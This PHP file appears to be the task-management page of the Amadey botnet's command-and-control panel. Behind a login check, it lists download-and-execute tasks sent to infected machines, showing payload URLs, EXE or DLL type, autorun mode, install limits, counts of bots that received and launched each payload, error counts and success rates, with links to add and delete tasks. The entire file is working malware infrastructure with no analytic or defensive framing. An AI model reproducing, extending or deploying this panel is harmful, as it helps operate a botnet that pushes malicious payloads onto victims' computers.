<?php

    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }

    function GetBG()
    {
       static $e = "0";

       if ( $e == "1" )
       {
          $e = "0";
          return "#E4E4E4";
       }
       
       if ( $e == "0" )
       {
          $e = "1";
          return "#dfdede";
       }
    }

    function GetTaskList() 
    {
       $filelist = glob( "./tasks/*.tsk" );

       if ( $handle = opendir( "./tasks/" ) ) 
       {     
          while ( $entry = readdir( $handle ) ) 
          {
            if ( strpos( $entry, "*" ) === 0 ) 
            {
               $filelist[] = $entry;

            }
          }

          closedir( $handle );

          echo "<div align = center> 
                   <table cellpadding = 1 cellspacing = 1 width = 1200 class = table style = \"border: 1px solid;\">
                      <tr>                       
                         <td><div align = center>Task id:</div></td>
                         <td><div align = center>For unit:</div></td>              
                         <td><div align = center>Url:</div></td>
                         <td><div align = center>PE type:</div></td>
                         <td><div align = center>Autorun:</div></td>
                         <td><div align = center>Limit:</div></td> 
                         <td><div align = center>Received:</div></td> 
                         <td><div align = center>Launched:</div></td> 
                         <td><div align = center>Download errors:</div></td> 
                         <td><div align = center>Launch errors:</div></td>
                         <td><div align = center>Progress:</div></td>
                         <td><div align = center>Success:</div></td>
                         <td><div align = center>Action:</div></td> 
                     </tr>";


          for ( $i = 0; $i < count( $filelist ); $i++ )
          {         
            $id = substr( file_get_contents( $filelist[$i] ), 0, 10 );
            $url_0 = substr( file_get_contents( $filelist[$i] ), 10, 1000 );
            $url_1 = substr( file_get_contents( $filelist[$i] ), 10, 1000 );
            $needs = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".n" ); 
            $ids = $d = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".i" );
            $done = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".d0" );
            $good = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".d1" );
            $d_err = $d = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".e0" );
            $l_err = $d = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".e1" );

            $progress = $done / ( $needs/100 ); 

            if ( strlen( $progress ) > 5 )
            {
               $progress = substr( $progress, 0, 5 ); 
            } 

            $success = $good / ( $needs/100 ) ;

            if ( strlen( $success ) > 5 )
            {
               $success = substr( $success, 0, 5 ); 
            } 

            if ( substr( $id, 8, 1 ) == 0 )
            {              
               $filetype = "EXE";
            }
            else 
            {
               $filetype = "DLL";  
            }

            if ( substr( $id, 9, 1 ) == 0 )
            {            
               $autorun = "Amadey";
            }
            else 
            {
               $autorun = "self";  
            }

            if ( strpos( $url_0, ":::" ) )
            {
               $url_0 = substr( $url_0, 0, strpos( $url_0, ":::" ) ) ;
            }

            if ( strpos( $url_1, ":::" ) )
            {
               $url_1 = substr( $url_1, 0, strpos( $url_1, ":::" ) ) ;
            }

            if ( strlen( $url_1 ) > 32 )
            {
               $url_1 = substr( $url_1, 0, 32 ) . "..."; 
            } 

            $gb = GetBG();

            echo "<tr>";
               echo "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"images\ic_1.png\"> " . $id . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $ids . "</div></td>";
               echo "<td bgcolor = " . $gb . ">" . "<div align = left>" . "<img src=\"images\ic_3.png\"> " . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</div>" . "</td>";
               echo "<td bgcolor = " . $gb . ">" . "<img src=\"images\ic_2.png\"> " . $filetype . "</td>";
               echo "<td bgcolor = " . $gb . ">" . $autorun . "</td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $needs . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $done . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";
               echo "<td bgcolor = " . $gb . "><div align = center>" . "<img src=\"images\ic_7.png\">&nbsp;<a href=\"del_task.php?id=" . $id . "\">delete</a> " . "</div></td>";
            echo "</tr>";

          } 
       }
       echo "   </table>
             </div>";


       echo "<div align = center>
                <table border=\"0\" width=\"1200\" cellspacing=\"0\" cellpadding=\"0\">
	           <tr>
		      <td>
                         <div align = right> 
                            <font size=2>
                               <a href=\"make_task.php\"><img src=\"images\ic_5.png\"> Add task</a>
                            </font>
                         </div>
                      </td>
	           </tr>
                </table>
             </div>";

    }


    include( "header.php" );

    echo GetTaskList();

    echo "</html>";

?> 